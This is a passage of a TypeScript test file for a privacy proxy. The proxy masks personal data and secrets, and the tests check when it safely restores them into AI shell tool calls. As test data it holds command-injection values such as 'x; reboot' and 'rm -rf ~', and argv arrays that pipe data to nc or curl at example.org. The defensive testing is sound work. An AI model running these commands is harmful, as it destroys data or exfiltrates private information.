    [['sudo', 'bash', '-c'], 0],
    [['BASH', '-c'], 0],
    [['bash5.2', '-c'], 0],
    [['fish', '-c'], 0],
  ])(
    'argv: restores into a -c script only for a POSIX shell named as written: %j',
    (shell, expected) => {
      const { np, vault, sessionId } = harness();
      const word = bake(vault, sessionId, EMAIL, 'private_email');

      expect(restored(restoreShellArgv(np, [...shell, `grep probe ${word}`], sessionId))).toBe(
        expected,
      );
    },
  );

  it('restores into both bodies of two heredocs opened on one line', () => {
    const { np, vault, sessionId } = harness();
    const first = bake(vault, sessionId, FULL_NAME, 'private_person');
    const second = bake(vault, sessionId, EMAIL, 'private_email');
    const command = `cat <<'A' <<'B' > notes.md\n${first}\nA\n${second}\nB\n`;

    const r = restoreShellCommand(np, command, sessionId);

    expect(restored(r)).toBe(2);
    expect(r.command).toBe(`cat <<'A' <<'B' > notes.md\n${FULL_NAME}\nA\n${EMAIL}\nB\n`);
  });
});

describe('shell restore · round-11 heredocs inside substitutions', () => {
  function harness() {
    const { np, vault } = vaultEngine();
    const sessionId = vault.createSession();
    return { np, vault, sessionId };
  }
  const restored = (r: { results: ReadonlyArray<{ replacements: number }> }) =>
    r.results.reduce((n, x) => n + x.replacements, 0);

  it.each(['a)" b', 'x) $(true', 'EOF) $(true) (', 'a `b` c', "D'Amico", 'a\\b'])(
    'a commit-message value that a shell could read as code stays masked: %j',
    (value) => {
      const { np, vault, sessionId } = harness();
      const word = bake(vault, sessionId, value, 'secret');

      expect(restored(restoreShellCommand(np, commitSubst(`fix: ${word}`), sessionId))).toBe(0);
    },
  );

  it.each([
    `git commit -m "\`cat <<'EOF'\nThanks PH\nEOF\n\`"`,
    `git commit -m "$(cat <<'EOF'\nEOF) PH\nEOF\n)"`,
    `git commit -m "$(cat <<'EOF'\nfix x)\nThanks PH\nEOF\n)"`,
    `git commit -m "$(cat <<'EOF'\nit's PH\nEOF\n)"`,
  ])('keeps every value where shells disagree on the substitution: %#', (command) => {
    const { np, vault, sessionId } = harness();
    const name = bake(vault, sessionId, FULL_NAME, 'private_person');

    expect(restored(restoreShellCommand(np, command.replace('PH', name), sessionId))).toBe(0);
  });

  it.each([
    [`git commit -m $(cat <<'EOF'\nAdd feature # (experimental\n) PH\nEOF\n)`, 'x; reboot'],
    [`git commit -m "$(cat <<'EOF'\nNote (ref PH) tail\nEOF\n)"`, 'word # x'],
  ])(
    "keeps every value where a `#` comment moves bash 3.2's end of `$(…)`: %#",
    (command, value) => {
      const { np, vault, sessionId } = harness();
      const word = bake(vault, sessionId, value, 'secret');

      expect(restored(restoreShellCommand(np, command.replace('PH', word), sessionId))).toBe(0);
    },
  );

  it('keeps every value in a command nested past the limit through a heredoc body', () => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');
    const inner = `${'$('.repeat(40)}ls ${word}${')'.repeat(40)}`;
    const command = `${'$('.repeat(30)}cat <<EOF\n${inner}\nEOF\n${')'.repeat(30)}`;

    expect(restored(restoreShellCommand(np, command, sessionId))).toBe(0);
  });

  it.each(['note #1 )"\nThanks PH', "fix #12's PH"])(
    'keeps every value where `#` reads differently inside `"$(…)"`: %j',
    (message) => {
      const { np, vault, sessionId } = harness();
      const name = bake(vault, sessionId, FULL_NAME, 'private_person');

      expect(
        restored(restoreShellCommand(np, commitSubst(message.replace('PH', name)), sessionId)),
      ).toBe(0);
    },
  );

  it.each(['fix #123 (see) PH', 'fix(gateway): thanks PH', 'plain message for PH'])(
    'keeps every value in a `$(…)` commit message, whatever it holds: %j',
    (message) => {
      const { np, vault, sessionId } = harness();
      const name = bake(vault, sessionId, FULL_NAME, 'private_person');
      const command = commitSubst(message.replace('PH', name));

      expect(restoreShellCommand(np, command, sessionId).command).toBe(command);
    },
  );

  it.each([
    (m: string) => `git commit -F - <<'EOF'\n${m}\nEOF`,
    (m: string) => `git commit -F- <<'EOF'\n${m}\nEOF`,
    (m: string) => `git commit --file=- <<'EOF'\n${m}\nEOF`,
    (m: string) => `git add -A && git commit --file - <<'EOF'\n${m}\nEOF`,
  ])('restores any value without a line break in a `git commit -F -` message: %#', (build) => {
    const { np, vault, sessionId } = harness();
    const name = bake(vault, sessionId, "Anna D'Amico", 'private_person');
    const message = (n: string) => `fix(gateway): thanks ${n} #123 (see)`;

    const r = restoreShellCommand(np, build(message(name)), sessionId);

    expect(r.command).toBe(build(message("Anna D'Amico")));
  });

  it.each([
    (m: string) => `git commit -F - <<'EOF' | cat\n${m}\nEOF`,
    (m: string) => `git -C repo commit -F - <<'EOF'\n${m}\nEOF`,
    (m: string) => `git commit -F msg.txt <<'EOF'\n${m}\nEOF`,
  ])('restores nothing but plain words in other `git commit` heredocs: %#', (build) => {
    const { np, vault, sessionId } = harness();
    const name = bake(vault, sessionId, FULL_NAME, 'private_person');

    expect(restored(restoreShellCommand(np, build(`thanks ${name}`), sessionId))).toBe(0);
  });

  it.each([';', '|', '&', '<', '>'])(
    'keeps every value where `%s#` and a blank-led `#` read differently in bash 3.2',
    (op) => {
      const { np, vault, sessionId } = harness();
      const word = bake(vault, sessionId, EMAIL, 'private_email');
      const command = `git commit -m $(cat <<'EOF'\nx #(\na${op}#)\nThanks ${word}\nEOF\n)`;

      expect(restored(restoreShellCommand(np, command, sessionId))).toBe(0);
    },
  );

  it.each(['EOF word (x)', 'EOFx)', 'EOF) more'])(
    'keeps every value after a body line that bash 5.2 reads as the end: %j',
    (line) => {
      const { np, vault, sessionId } = harness();
      const word = bake(vault, sessionId, EMAIL, 'private_email');
      const command = `git commit -m "$(cat <<'EOF'\nfix\n${line}\nby ${word}\nEOF\n)"`;

      expect(restored(restoreShellCommand(np, command, sessionId))).toBe(0);
    },
  );

  it('keeps every value in a `$(…)` that holds a `case`', () => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');
    const command = `git commit -m $(case a in a)\ncat <<'EOF'\n${word}\nEOF\n;; esac)`;

    expect(restored(restoreShellCommand(np, command, sessionId))).toBe(0);
  });

  it.each([
    (p: string) => `cat <(cat <<'EOF'\n${p}\nEOF\n)`,
    (p: string) => `git commit -F <(cat <<'EOF'\n${p}\nEOF\n)`,
    (p: string) => `ls ${p} >(cat <<'EOF'\nx\nEOF\n)`,
    (p: string) => `git commit -F - \${x:-<<'EOF'\n${p}\nEOF\n}`,
    (p: string) => `git commit -F - <<'EOF' \${x:-\n${p}\nEOF\n}`,
    (p: string) => `cat <<'EOF' && git commit -m \${x:-\n${p}\nEOF\n}`,
  ])('keeps every value with a heredoc in process substitution or `${…}`: %#', (build) => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, 'hi } ; reboot ; echo {', 'secret');

    expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(0);
  });

  it('keeps every value in a command with any `$`, even a one-line `${…}`', () => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');
    const command = `git commit -m "release \${VERSION:-1}" --author=${word}`;

    expect(restored(restoreShellCommand(np, command, sessionId))).toBe(0);
  });

  it('judges many substitutions with heredocs in linear time', () => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');
    const unit = "$(cat <<'E'\n #(\nE\n)\n";
    const command = `ls ${word}\n${unit.repeat(Math.floor((MAX_COMMAND_CHARS - 64) / unit.length))}`;

    const started = performance.now();
    restoreShellCommand(np, command, sessionId);
    expect(performance.now() - started).toBeLessThan(MAX_LONG_COMMAND_MS);
  });

  it('a body outside a substitution still takes quotes and parentheses', () => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, 'a)" `b` c', 'secret');

    expect(
      restored(restoreShellCommand(np, `cat > notes.md <<'EOF'\n${word}\nEOF`, sessionId)),
    ).toBe(1);
  });

  it.each([
    (p: string) => `cat > notes.md <<EOF\n$${p}\nEOF`,
    (p: string) => `cat > notes.md <<EOF\n\${${p}}\nEOF`,
    (p: string) => `git commit -m "$${p}"`,
  ])('a value right after `$` or `${` stays masked: %#', (build) => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, 'HOME', 'secret');

    expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(0);
  });
});

describe('shell restore · argv commands', () => {
  function harness() {
    const { np, vault } = vaultEngine();
    const sessionId = vault.createSession();
    return { np, vault, sessionId };
  }

  it('a shell given a script element gets the strictest rule', () => {
    const { np, vault, sessionId } = harness();
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
    const email = bake(vault, sessionId, EMAIL, 'private_email');
    const secret = bake(vault, sessionId, INJECTION, 'secret');

    const r = restoreShellArgv(np, ['bash', '-lc', `echo ${person} ${email} ${secret}`], sessionId);

    expect(r.argv).toEqual(['bash', '-lc', `echo ${person} ${EMAIL} ${secret}`]);
    expect(r.keptMasked).toEqual([person, secret]);
  });

  it('restores one plain word as an argument, and nothing else, as in a string command', () => {
    const { np, vault, sessionId } = harness();
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    const r = restoreShellArgv(np, ['grep', '-F', person, email], sessionId);

    expect(r.argv).toEqual(['grep', '-F', person, EMAIL]);
    expect(r.keptMasked).toEqual([person]);
  });

  it('judges the script a shell runs as a string command', () => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    const r = restoreShellArgv(np, ['bash', '-lc', `${email} --help; echo ${email}`], sessionId);

    // The script's first command is named by a value: nothing comes back.
    expect(r.argv).toEqual(['bash', '-lc', `${email} --help; echo ${email}`]);
    expect(r.keptMasked).toEqual([email, email]);
  });

  it('keeps a value that is not inert masked even as a literal argument', () => {
    const { np, vault, sessionId } = harness();
    const secret = bake(vault, sessionId, INJECTION, 'secret');

    const r = restoreShellArgv(np, ['grep', '-F', secret, 'notes.txt'], sessionId);

    expect(r.argv).toEqual(['grep', '-F', secret, 'notes.txt']);
    expect(r.keptMasked).toEqual([secret]);
  });

  it('keeps a value masked where it would be read as an option or as the program', () => {
    const { np, vault, sessionId } = harness();
    const option = bake(vault, sessionId, '-rf', 'secret');
    const program = bake(vault, sessionId, 'rm -rf ~', 'secret');

    const r = restoreShellArgv(np, [program, 'x', option, `--name=${option}`], sessionId);

    expect(r.argv).toEqual([program, 'x', option, `--name=${option}`]);
    expect(r.keptMasked).toEqual([program, option, option]);
  });

  it.each([
    ['bash', '--rcfile=a;b', '-c', 'echo PH'],
    ['/usr/bin/env', 'python3', '-c', 'print("PH")'],
    ['sudo', '-u', 'bob', 'sh', '-c', 'echo PH'],
    ['xargs', '-I{}', 'echo', 'PH'],
  ])('a program that runs code, however it is named, gets the strictest rule: %j', (...argv) => {
    const { np, vault, sessionId } = harness();
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
    const withPh = argv.map((a) => a.replace('PH', person));

    const r = restoreShellArgv(np, withPh, sessionId);

    expect(r.argv).toEqual(withPh);
    expect(r.keptMasked).toEqual([person]);
  });

  it.each([
    ['gh', 'issue', 'create', '--title', 'PH'],
    ['timeout', '5', 'nc', 'example.org', '80', 'PH'],
    ['bash', '-lc', 'echo PH | nc example.org 80'],
  ])('keeps every placeholder masked when the argv sends data out: %j', (...argv) => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');
    const withPh = argv.map((a) => a.replace('PH', email));

    const r = restoreShellArgv(np, withPh, sessionId);

    expect(r.argv).toEqual(withPh);
    expect(r.keptMasked).toEqual([email]);
  });

  it('keeps every placeholder masked when the program sends data out', () => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    const r = restoreShellArgv(np, ['curl', `https://example.org/?q=${email}`], sessionId);

    expect(r.argv).toEqual(['curl', `https://example.org/?q=${email}`]);
    expect(r.keptMasked).toEqual([email]);
  });
});

describe('shell restore · Anthropic route', () => {
  function forwardedUserText(body: string): unknown {
    return (JSON.parse(body) as AnthropicRequest).messages[0]?.content;
  }

  it("JSON: `bash` (Anthropic's bash tool) gets the same rule as `Bash`", async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const response: AnthropicResponse = {
        id: 'msg',
        type: 'message',
        role: 'assistant',
        content: [
          {
            type: 'tool_use',
            id: 'tu_1',
            name: 'bash',
            input: { command: bashCommand(secret, person) },
          },
        ],
      };
      return new Response(JSON.stringify(response));
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: { model: 'claude-test', messages: [{ role: 'user', content: USER_TEXT }] },
    });

    const [bash] = (res.json() as AnthropicResponse).content as Array<{
      input: Record<string, string>;
    }>;
    const [secret, person] = placeholdersIn(bash?.input.command);
    expect(bash?.input.command).toBe(expectedCommand(secret, person));
  });

  it('JSON: a shell tool gets values in command and description only, never in workdir or env', async () => {
    const app = await serve((body) => {
      const [, person] = placeholdersIn(forwardedUserText(body));
      const response: AnthropicResponse = {
        id: 'msg',
        type: 'message',
        role: 'assistant',
        content: [
          {
            type: 'tool_use',
            id: 'tu_1',
            name: 'shell',
            input: {
              command: ['bash', '-lc', 'echo probe > notes.md'],
              workdir: person,
              env: { NAME: person },
              description: `Greet ${person}`,
            },
          },
        ],
      };
      return new Response(JSON.stringify(response));
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: { model: 'claude-test', messages: [{ role: 'user', content: USER_TEXT }] },
    });

    const [shell] = (res.json() as AnthropicResponse).content as Array<{
      input: { workdir: string; env: { NAME: string }; description: string };
    }>;
    expect(shell?.input.workdir).toMatch(PLACEHOLDER);
    expect(shell?.input.env.NAME).toMatch(PLACEHOLDER);
    expect(shell?.input.description).toBe(`Greet ${FULL_NAME}`);
  });

  it('JSON: restores a Bash command only where safe, a Write tool fully', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const response: AnthropicResponse = {
        id: 'msg',
        type: 'message',
        role: 'assistant',
        content: [
          {
            type: 'tool_use',
            id: 'tu_1',
            name: 'Bash',
            input: { command: bashCommand(secret, person), description: `Greet ${person}` },
          },
          {
            type: 'tool_use',
            id: 'tu_2',
            name: 'Write',
            input: { file_path: '/tmp/notes.txt', content: `${secret} ${person}` },
          },
        ],
      };
      return new Response(JSON.stringify(response));
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: { model: 'claude-test', messages: [{ role: 'user', content: USER_TEXT }] },
    });

    expect(res.statusCode).toBe(200);
    const [bash, write] = (res.json() as AnthropicResponse).content as Array<{
      input: Record<string, string>;
    }>;
    const [secret, person] = placeholdersIn(bash?.input.command);
    expect(bash?.input.command).toBe(expectedCommand(secret, person));
    // Not run by the shell: restored as usual.
    expect(bash?.input.description).toBe(`Greet ${FULL_NAME}`);
    expect(write?.input.content).toBe(`${INJECTION} ${FULL_NAME}`);
  });

  it('SSE: same rule for a Bash command streamed as input_json_delta shards', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const bash = JSON.stringify({ command: bashCommand(secret, person) });
      const write = JSON.stringify({ file_path: '/tmp/notes.txt', content: `${secret} ${person}` });
      const cut = bash.indexOf(secret) + 6; // inside the first placeholder
      const shard = (index: number, partial: string) =>
        anthropicFrame('content_block_delta', {
          type: 'content_block_delta',
          index,
          delta: { type: 'input_json_delta', partial_json: partial },
        });
      const start = (index: number, name: string) =>
        anthropicFrame('content_block_start', {
          type: 'content_block_start',
          index,
          content_block: { type: 'tool_use', id: `tu_${index}`, name, input: {} },
        });
      const stop = (index: number) =>
        anthropicFrame('content_block_stop', { type: 'content_block_stop', index });
      return sseResponse([
        start(0, 'Bash'),
        shard(0, bash.slice(0, cut)),
        shard(0, bash.slice(cut)),
        stop(0),
        start(1, 'Write'),
        shard(1, write),
        stop(1),
        anthropicFrame('message_stop', { type: 'message_stop' }),
      ]);
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: {
        model: 'claude-test',
        stream: true,
        messages: [{ role: 'user', content: USER_TEXT }],
      },
    });

    expect(res.statusCode).toBe(200);
    const inputs = streamedInputs(res.body);
    const bash = JSON.parse(inputs.get(0) ?? '') as { command: string };
    const [secret, person] = placeholdersIn(bash.command);
    expect(bash.command).toBe(expectedCommand(secret, person));
    expect(JSON.parse(inputs.get(1) ?? '')).toEqual({
      file_path: '/tmp/notes.txt',
      content: `${INJECTION} ${FULL_NAME}`,
    });
  });
});

describe('shell restore · OpenAI route', () => {
  function forwardedUserText(body: string): unknown {
    return (JSON.parse(body) as ChatCompletionRequest).messages[0]?.content;
  }

  it('JSON: restores a `bash` command only where safe, another tool fully', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const response: ChatCompletionResponse = {
        id: 'c1',
        object: 'chat.completion',
        choices: [
          {
            index: 0,
            finish_reason: 'tool_calls',
            message: {
              role: 'assistant',
              content: null,
              tool_calls: [
                {
                  id: 'call_1',
                  type: 'function',
                  function: {
                    name: 'bash',
                    arguments: JSON.stringify({ command: bashCommand(secret, person) }),
                  },
                },
                {
                  id: 'call_2',
                  type: 'function',
                  function: {
                    name: 'write_file',
                    arguments: JSON.stringify({ content: `${secret} ${person}` }),
                  },
                },
                {
                  id: 'call_3',
                  type: 'custom',
                  custom: { name: 'shell', input: `echo ${secret} '${person}'` },
                },
              ],
            },
          },
        ],
      };
      return new Response(JSON.stringify(response));
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/chat/completions',
      payload: { model: 'gpt-test', messages: [{ role: 'user', content: USER_TEXT }] },
    });

    expect(res.statusCode).toBe(200);
    const calls = (res.json() as ChatCompletionResponse).choices[0]?.message?.tool_calls ?? [];
    const bash = JSON.parse(calls[0]?.function?.arguments ?? '') as { command: string };
    const [secret, person] = placeholdersIn(bash.command);
    expect(bash.command).toBe(expectedCommand(secret, person));
    expect(JSON.parse(calls[1]?.function?.arguments ?? '')).toEqual({
      content: `${INJECTION} ${FULL_NAME}`,
    });
    // A custom shell tool's whole input is the command.
    expect(calls[2]?.custom?.input).toBe(`echo ${secret} '${person}'`);
  });

  it('JSON: a `shell` call whose command is an argv array (Codex) gets the rule', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const response: ChatCompletionResponse = {
        id: 'c1',
        object: 'chat.completion',
        choices: [
          {
            index: 0,
            finish_reason: 'tool_calls',
            message: {
              role: 'assistant',
              content: null,
              tool_calls: [
                {
                  id: 'call_1',
                  type: 'function',
                  function: {
                    name: 'shell',
                    arguments: JSON.stringify({
                      command: ['bash', '-lc', `echo ${secret} '${person}'`],
                      workdir: '/tmp',
                    }),
                  },
                },
              ],
            },
          },
        ],
      };
      return new Response(JSON.stringify(response));
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/chat/completions',
      payload: { model: 'gpt-test', messages: [{ role: 'user', content: USER_TEXT }] },
    });

    const calls = (res.json() as ChatCompletionResponse).choices[0]?.message?.tool_calls ?? [];
    const args = JSON.parse(calls[0]?.function?.arguments ?? '') as { command: string[] };
    const [secret, person] = placeholdersIn(args.command[2]);
    expect(args.command).toEqual(['bash', '-lc', `echo ${secret} '${person}'`]);
  });

  it('SSE: same rule for a `shell` call whose arguments stream in shards', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const args = JSON.stringify({ command: bashCommand(secret, person) });
      const cut = args.indexOf(secret) + 6;
      const call = (fn: Record<string, string>, extra: Record<string, string> = {}) =>
        openAiFrame([{ index: 0, delta: { tool_calls: [{ index: 0, ...extra, function: fn }] } }]);
      return sseResponse([
        call({ name: 'shell', arguments: '' }, { id: 'call_1', type: 'function' }),
        call({ arguments: args.slice(0, cut) }),
        call({ arguments: args.slice(cut) }),
        openAiFrame([{ index: 0, delta: {}, finish_reason: 'tool_calls' }]),
        'data: [DONE]\n\n',
      ]);
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/chat/completions',
      payload: {
        model: 'gpt-test',
        stream: true,
        messages: [{ role: 'user', content: USER_TEXT }],
      },
    });

    expect(res.statusCode).toBe(200);
    const command = (JSON.parse(streamedInputs(res.body).get(0) ?? '') as { command: string })
      .command;
    const [secret, person] = placeholdersIn(command);
    expect(command).toBe(expectedCommand(secret, person));
  });
});

describe('shell restore · request log', () => {
  it.each([
    ['/v1/messages', 'anthropic.messages.restored'],
    ['/v1/chat/completions', 'openai.chat.restored'],
  ])('%s logs how many placeholders stayed masked, never a value', async (url, message) => {
    const lines: string[] = [];
    const app = await serve(
      (body) => {
        const request = JSON.parse(body) as { messages: Array<{ content: unknown }> };
        const [secret, person] = placeholdersIn(request.messages[0]?.content);
        const command = bashCommand(secret, person);
        const response =
          url === '/v1/messages'
            ? {
                id: 'msg',
                type: 'message',
                role: 'assistant',
                content: [{ type: 'tool_use', id: 'tu', name: 'Bash', input: { command } }],
              }
            : {
                id: 'c1',
                object: 'chat.completion',
                choices: [
                  {
                    index: 0,
                    message: {
                      role: 'assistant',
                      tool_calls: [
                        {
                          id: 'call',
                          type: 'function',
                          function: { name: 'bash', arguments: JSON.stringify({ command }) },
                        },
                      ],
                    },
                  },
                ],
              };
        return new Response(JSON.stringify(response));
      },
      { logLevel: 'info', logStream: { write: (line) => lines.push(line) } },
    );

    const res = await app.inject({
      method: 'POST',
      url,
      payload: { model: 'test', messages: [{ role: 'user', content: USER_TEXT }] },
    });

    expect(res.statusCode).toBe(200);
    const entry = lines
      .map((l) => JSON.parse(l) as { msg?: string; unsafeShellPlaceholders?: unknown })
      .find((l) => l.msg === message);
    // The secret and the name, each quoted and unquoted, stayed masked.
    expect(entry?.unsafeShellPlaceholders).toBe(4);
    const log = lines.join('');
    for (const value of [INJECTION, 'evil.sh', FULL_NAME, 'Smith']) {
      expect(log).not.toContain(value);
    }
  });
});

describe('shell restore · tool input fields', () => {
  function harness() {
    const { np, vault } = vaultEngine();
    const sessionId = vault.createSession();
    return { np, vault, sessionId };
  }

  it('keeps every placeholder in a shell tool input that is not an object', () => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');
    for (const input of [`grep ${word} notes.md`, ['grep', word, 'notes.md']]) {
      const acc = newRestoreAccumulator();
      expect(restoreToolInput(np, input, sessionId, acc, shellToolOf('shell'))).toEqual(input);
      expect(acc.unsafeShell).toBe(1);
    }
  });

  it('treats a workdir as a cd: a relative write gets no value', () => {
    const { np, vault, sessionId } = harness();
    const name = bake(vault, sessionId, FULL_NAME, 'private_person');
    const command = `cat > notes.md <<'EOF'\n${name}\nEOF`;
    const acc = newRestoreAccumulator();

    const moved = restoreToolInput(
      np,
      { command, workdir: '/srv/x' },
      sessionId,
      acc,
      shellToolOf('shell'),
    );
    const stays = restoreToolInput(np, { command }, sessionId, acc, shellToolOf('shell'));

    expect((moved as { command: string }).command).toBe(command);
    expect((stays as { command: string }).command).toContain(FULL_NAME);
  });

  it("judges Codex's exec_command by its cmd field and gives write_stdin nothing", () => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');
    const acc = newRestoreAccumulator();

    const exec = restoreToolInput(
      np,
      { cmd: `grep ${word} notes.md` },
      sessionId,
      acc,
      shellToolOf('exec_command'),
    );
    const stdin = restoreToolInput(
      np,
      { session_id: 1, chars: `${word}\n` },
      sessionId,
      acc,
      shellToolOf('write_stdin'),
    );

    expect((exec as { cmd: string }).cmd).toBe(`grep ${EMAIL} notes.md`);
    expect((stdin as { chars: string }).chars).toBe(`${word}\n`);
  });
});
